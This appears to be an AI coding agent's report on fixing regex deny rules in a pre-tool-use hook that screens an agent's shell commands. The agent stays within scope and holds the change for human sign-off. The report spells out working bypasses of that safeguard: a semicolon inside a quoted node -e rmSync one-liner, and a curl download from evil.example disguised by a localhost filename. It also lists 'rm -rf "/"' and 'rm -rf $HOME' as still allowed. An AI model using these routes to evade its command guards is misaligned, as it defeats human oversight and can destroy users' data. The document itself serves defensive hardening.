---
date: 2026-09-07
role: builder
task: hook-separator-bypass
qa_verdict: PASS
tier: irreversible
branch: fix/hook-separator-bypass
pushed: false
---
Five rules in `.claude/hooks/pre-tool-use.sh` matched `<trigger>[^|;]*<payload>`, and that class cannot span a semicolon — including a semicolon **inside a quoted string**, which every interpreter one-liner has. `node -e "require('fs').rmSync(…)"` blocked; `node -e "const fs = require('fs'); fs.rmSync(…)"` exit 0. The form that got through is the more conventional style, and neither child was told to evade.
Fix: `segment_command` splits on separators the shell would honour — `;` and `|` outside quotes and outside a backslash escape — once, in one awk pass; `seg_match` runs each rule per segment with the middle class relaxed to `.*` *within* a segment. `[^|;]*` was NOT widened to `.*`: that closes the hole by discarding the property the class holds. Splitting cannot lose a block (any old match contains no `;`/`|`, so it lies inside one segment) and fails closed if the splitter yields nothing.
Free second fix: `^`/`$` are per-segment anchors now, so `git checkout .; ls` — allowed before — is refused. The `&&` form is not closed; not split on, deliberately, because that is a different blast radius.
Evidence, same 32 probes both cells: **10 red before / 0 after**, and the 20 negative controls IDENTICAL in both — that is the half saying the rules were narrowed, not widened. `scripts/pre-tool-use.test.mjs` 203 pass · 0 fail. Full suite 49 of 49.
Cost, pinned as `[C2b]`: a heredoc documenting the const-bound form now blocks too. There is no heredoc rule — the hook has no shell parser, so every Bash rule reads the body as command text; `git clean`, the interpreter rule, `wget` and external `curl` all fire on documentation, before and after. Not loosened. Escape hatch unchanged: `Write` checks `file_path`, never content.
One-pass review over the other rules found 12 gaps of the same class, all pre-existing and byte-identical before and after my diff. Sharpest: **the curl localhost exclusion is whole-command**, so `curl https://evil.example/x -o /tmp/localhost.txt` is ALLOWED; `rm -rf "/"`, `rm -rf $HOME` allowed; `npx` behind `FOO=1` or `bash -c` allowed; `chmod a+x`, `npm install --global` allowed. Reported, not fixed — outside the briefed scope.
Standing caveat: author-recorded verdict, one agent, one model family. `irreversible` asks 2-of-3 multi-judge and ≥2 model families; unmet. Unpushed and unmerged for founder sign-off.
